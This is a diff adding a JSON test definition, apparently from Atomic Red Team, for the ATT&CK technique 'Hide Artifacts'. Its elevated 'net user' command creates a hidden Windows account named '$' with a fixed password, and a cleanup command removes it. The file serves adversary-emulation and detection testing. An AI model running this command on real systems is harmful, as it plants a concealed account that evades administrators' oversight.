@@ -1,0 +1,25 @@
+{
+    "name": "Create a Hidden User Called \"$\"",
+    "description": "Creating a user with a username containing $",
+    "supported_platforms": [
+        "windows"
+    ],
+    "executor": {
+        "name": "command_prompt",
+        "elevation_required": true,
+        "command": "net user $ ATOMIC123! /add /active:yes",
+        "cleanup_command": "net user $ /DELETE 2>&1",
+        "type": "Command Executor"
+    },
+    "id": "T1564",
+    "tactics": [
+        "Defense Evasion"
+    ],
+    "technique": "Hide Artifacts",
+    "source": "ART",
+    "uuid": "2ec63cc2-4975-41a6-bf09-dffdfb610778",
+    "arguments": null,
+    "preconditions": [],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
